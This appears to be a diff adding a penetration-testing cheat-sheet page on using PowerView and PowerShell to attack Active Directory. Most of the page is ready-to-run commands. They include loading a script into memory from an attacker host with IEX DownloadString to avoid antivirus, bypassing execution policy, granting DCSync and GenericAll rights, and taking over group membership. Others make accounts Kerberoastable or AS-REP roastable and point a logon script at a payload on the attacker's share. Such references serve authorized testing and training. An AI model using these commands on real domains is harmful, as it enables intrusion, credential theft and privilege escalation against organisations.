@@ -1,0 +1,171 @@
+# PowerShell / PowerView
+
+PowerView is the go-to Windows-side enumeration and manipulation library for AD. Import it once and use it for everything from ACL reads to object modification. This page also covers PS Remoting and the credential object pattern used when operating as a different user without switching sessions.
+
+## Setup
+
+Import PowerView and bypass execution policy restrictions. Always load from a writable path or memory if AV is active.
+
+```powershell
+# Load from disk
+Import-Module .\PowerView.ps1
+
+# Bypass execution policy without changing system settings
+powershell -ep bypass
+Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
+
+# Load directly from memory (avoids touching disk)
+IEX (New-Object Net.WebClient).DownloadString('http://$LHOST/PowerView.ps1')
+```
+
+## Credential Objects
+
+Use credential objects to run commands as a different user without switching your session. Essential when you have creds for a user but are not running as them.
+
+```powershell
+# Build a credential object
+$pass = ConvertTo-SecureString '$PASSWORD' -AsPlainText -Force
+$cred = New-Object System.Management.Automation.PSCredential('$DOMAIN\$USER', $pass)
+
+# Use -Credential $cred on any PowerView or AD cmdlet
+Get-DomainUser -Credential $cred
+Get-DomainGroup -Credential $cred -Identity "Core Staff"
+```
+
+## PS Remoting
+
+PS Remoting gives you an interactive PowerShell session on a remote host over WinRM (port 5985/5986). Requires the account to be in Remote Management Users or be a local admin.
+
+```powershell
+# Interactive session
+Enter-PSSession -ComputerName $TARGET -Credential $cred
+
+# Run a single command remotely without entering a session
+Invoke-Command -ComputerName $TARGET -Credential $cred -ScriptBlock { whoami }
+Invoke-Command -ComputerName $TARGET -Credential $cred -ScriptBlock { Get-Process }
+
+# Load a script on the remote host from your attacker machine
+Invoke-Command -ComputerName $TARGET -Credential $cred -FilePath .\PowerView.ps1
+
+# Create a persistent session object (reuse for multiple commands)
+$session = New-PSSession -ComputerName $TARGET -Credential $cred
+Invoke-Command -Session $session -ScriptBlock { whoami }
+Enter-PSSession -Session $session
+
+# Copy files over PS Remoting
+Copy-Item -Path .\tool.exe -Destination C:\Windows\Temp\tool.exe -ToSession $session
+```
+
+## Enumeration
+
+Core enumeration commands. These are the ones you run right after getting a foothold or credential.
+
+```powershell
+# Users
+Get-DomainUser                                                  # all domain users
+Get-DomainUser -Identity $TARGET                               # specific user
+Get-DomainUser -SPN                                            # Kerberoastable accounts
+Get-DomainUser -UACFilter DONT_REQ_PREAUTH                     # AS-REP roastable accounts
+Get-DomainUser -Properties samaccountname,description,memberof # targeted attributes
+
+# Groups
+Get-DomainGroup                                                 # all groups
+Get-DomainGroup -Identity "Domain Admins"                      # specific group
+Get-DomainGroupMember -Identity "Domain Admins" -Recurse       # recursive membership
+
+# Computers
+Get-DomainComputer                                             # all computer accounts
+Get-DomainComputer -Unconstrained                             # unconstrained delegation
+Get-DomainComputer -TrustedToAuth                             # constrained delegation
+
+# ACLs
+Get-DomainObjectAcl -Identity $TARGET -ResolveGUIDs           # ACL on a specific object
+Find-InterestingDomainAcl -ResolveGUIDs                       # sweep for interesting ACEs
+
+# GPO
+Get-DomainGPO                                                  # all GPOs
+Get-DomainGPO -ComputerIdentity $TARGET                       # GPOs applied to a computer
+
+# OU
+Get-DomainOU                                                   # all OUs
+```
+
+## ACL Manipulation
+
+Modify object permissions. Used when you have ownership or WriteDACL over an object and need to grant yourself additional rights.
+
+```powershell
+# Grant yourself (or another principal) GenericAll on a target object
+Add-DomainObjectAcl -TargetIdentity $TARGET -PrincipalIdentity $USER -Rights All
+
+# Grant rights using a specific credential object (common when operating as a different user)
+Add-DomainObjectAcl -Credential $cred -TargetIdentity $TARGET -PrincipalIdentity $USER -Rights All
+
+# Grant WriteMember specifically (enough to add members to a group)
+Add-DomainObjectAcl -Credential $cred -TargetIdentity "Core Staff" -PrincipalIdentity $USER -Rights WriteMembers
+
+# Grant DCSync rights on the domain object
+Add-DomainObjectAcl -TargetIdentity "$DOMAIN" -PrincipalIdentity $USER -Rights DCSync
+
+# Remove ACL entry after use (clean up)
+Remove-DomainObjectAcl -TargetIdentity $TARGET -PrincipalIdentity $USER -Rights All
+```
+
+## Group Manipulation
+
+Add or remove members from groups. Requires WriteMember or GenericWrite on the group object.
+
+```powershell
+# Add a user to a group
+Add-DomainGroupMember -Identity "Core Staff" -Members $USER
+Add-DomainGroupMember -Credential $cred -Identity "Core Staff" -Members $USER
+
+# Remove a user from a group
+Remove-DomainGroupMember -Identity "Core Staff" -Members $USER
+
+# Verify membership
+Get-DomainGroupMember -Identity "Core Staff"
+```
+
+## Object Property Modification
+
+Set arbitrary properties on AD objects. Requires GenericWrite or WriteProperty on the target.
+
+```powershell
+# Set an SPN on a user (Targeted Kerberoasting)
+Set-DomainObject -Identity $TARGET -Set @{serviceprincipalname="fake/spn.$DOMAIN"}
+
+# Clear an SPN (clean up after targeted Kerberoasting)
+Set-DomainObject -Identity $TARGET -Clear serviceprincipalname
+
+# Set scriptPath (logon script abuse — runs on next logon)
+Set-DomainObject -Identity $TARGET -Set @{scriptpath="\\$LHOST\share\payload.bat"}
+
+# Disable pre-authentication (make account AS-REP roastable)
+Set-DomainObject -Identity $TARGET -XOR @{useraccountcontrol=4194304}
+```
+
+## Owner to Group Membership Flow
+
+A common BloodHound path: you own a group but are not a member of it, and do not have WriteMember rights. As the owner you control the DACL, so you can grant yourself WriteMember first, then add yourself.
+
+| Right | What it means |
+|-------|---------------|
+| Owner | Controls the DACL, can grant or modify any permission on the object |
+| Member | Is listed inside the group and inherits the group's privileges |
+| WriteMember / GenericWrite | Can add or remove members from the group |
+
+```powershell
+# Step 1: Build a credential object for the account that owns the group
+$pass = ConvertTo-SecureString '$PASSWORD' -AsPlainText -Force
+$cred = New-Object System.Management.Automation.PSCredential('$DOMAIN\$USER', $pass)
+
+# Step 2: Grant yourself WriteMember rights on the group (you can do this because you own it)
+Add-DomainObjectAcl -Credential $cred -TargetIdentity "Core Staff" -PrincipalIdentity "$DOMAIN\$USER" -Rights WriteMembers
+
+# Step 3: Add yourself as a member
+Add-DomainGroupMember -Credential $cred -Identity "Core Staff" -Members "$DOMAIN\$USER"
+
+# Step 4: Verify
+Get-DomainGroupMember -Identity "Core Staff"
+```
